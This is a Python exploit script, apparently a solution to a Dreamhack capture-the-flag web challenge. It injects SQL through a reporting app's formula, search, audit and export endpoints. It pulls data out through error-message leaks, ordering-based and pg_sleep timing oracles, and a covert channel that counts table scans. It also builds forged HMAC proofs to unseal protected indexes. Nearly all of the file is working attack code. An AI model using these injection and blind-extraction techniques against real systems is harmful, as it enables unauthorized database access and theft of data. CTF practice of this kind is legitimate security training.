import sys, json, time, requests, os
B="http://host3.dreamhack.games:16325"
s=requests.Session(); s.get(B+"/",timeout=10)
def api(path, expr, kind="formula", **extra):
    idx={"kind":kind, {"formula":"expr","field":"name","literal":"value"}[kind]:expr}
    r=s.post(B+path,json={"index":idx,**extra},timeout=20)
    return r.status_code, r.text
def report(expr, name="r"):
    r=s.post(B+"/api/reports/save",json={"name":name,"definition":{"version":1,"index":{"kind":"formula","expr":expr}}},timeout=10).json()
    if "report_id" not in r: return r
    rid=r["report_id"]; run=s.post(B+"/api/reports/run",json={"report_id":rid},timeout=10).json()
    if "run_id" not in run: return run
    for _ in range(40):
        v=s.get(f"{B}/api/reports/{rid}/runs/{run['run_id']}",timeout=10).json()
        if v.get("state")!="pending": return v
        time.sleep(0.5)
    return v
def leak(q, path="/api/audit"):
    c,t=api(path, f"('x'||({q}))", query="harvest")
    try: return json.loads(t).get("engine_error")
    except: return t[:300]
def full(q, n=100):
    out=""; i=1
    while True:
        e=leak(f"select substr(({q}),{i},{n})")
        if not e or not e.startswith('invalid input syntax'): return out+(f" [ERR {e}]" if e else "")
        part=e.split('"x',1)[1]
        if part.endswith('"'): part=part[:-1]
        out+=part
        if len(part)<n: return out
        i+=n
def s_or(cond):
    c,t=api("/api/search", f"CASE WHEN ({cond}) THEN -quality_score ELSE CASE WHEN grove_code='IH-002' THEN 0 ELSE quality_score END END")
    o=[r["grove_code"] for r in json.loads(t)["rows"]]
    if o==['IH-004','IH-003','IH-002','IH-001']: return True
    if o[-1]=='IH-002': return False
    raise Exception("err order %r"%o)
def t_or(cond, d=0.6):
    t0=time.time(); api("/api/formulas/check", f"CASE WHEN ({cond}) THEN (select 1 from pg_sleep({d})) ELSE 0 END")
    return time.time()-t0 > d*0.8+0.15
def leak_bytes(oracle, expr):
    n=0
    for b in range(8,-1,-1):
        if oracle(f"octet_length({expr})>={n+(1<<b)}"): n+=1<<b
    out=bytearray()
    for i in range(n):
        v=0
        for b in range(7,-1,-1):
            if oracle(f"get_byte({expr},{i})>={v+(1<<b)}"): v+=1<<b
        out.append(v)
    return bytes(out)
def scans(rel):
    e=leak(f"select seq_scan::text from pg_stat_all_tables where schemaname='archive_stage' and relname='{rel}'")
    return int(e.split('"x',1)[1].rstrip('"'))
def x_send(valexpr, sig="worker_manifest"):
    before=scans(sig)
    api("/api/export", f"(select count(*) from generate_series(1, 1+({valexpr})) g, lateral (select 1 from archive_stage.{sig} w where g.g>0 limit 1) x)")
    for _ in range(10):
        time.sleep(0.7); d=scans(sig)-before
        if d>0: return d-1
    return None
def x_str(sqltext, sig="export_capsule"):
    T=f"convert_to(({sqltext}),'UTF8')"
    n=x_send(f"octet_length({T})", sig=sig)
    return bytes(x_send(f"get_byte({T},{i})", sig=sig) for i in range(n)).decode('utf-8','replace')
CAPS=dict(route="50deff7918bca4b0",clock="66d4c1a740467822",chart="3ff36382c845952e",audit="d7b8686a714cd93a",export="0f66ebdf74e2fc0d")
def proof_sql(keysql, i):
    msg=("decode('7265706f72742d70726f6f6600','hex')||int2send(octet_length(convert_to(session_user,'UTF8'))::smallint)||convert_to(session_user,'UTF8')"
         "||int2send(26::smallint)||convert_to('app_owner_7bad043ad9287146','UTF8')"
         "||uuid_send(current_setting('app.report_id')::uuid)||uuid_send(current_setting('app.run_id')::uuid)||int4send(%d)")%i
    return f"worker_shadow.unseal_index({i}, encode(crypto.hmac({msg}, {keysql}, 'sha256'),'hex'))"
import struct
_su=b"report_worker_4d6cb67b49082ac6"; _cu=b"app_owner_7bad043ad9287146"
PREFIX=(b"report-proof\0"+struct.pack(">h",len(_su))+_su+struct.pack(">h",len(_cu))+_cu).hex()
def proof_sql(keysql, i):
    msg=f"decode('{PREFIX}','hex')||uuid_send(current_setting('app.report_id')::uuid)||uuid_send(current_setting('app.run_id')::uuid)||int4send({i})"
    return f"worker_shadow.unseal_index({i},encode(crypto.hmac({msg},{keysql},'sha256'),'hex'))"
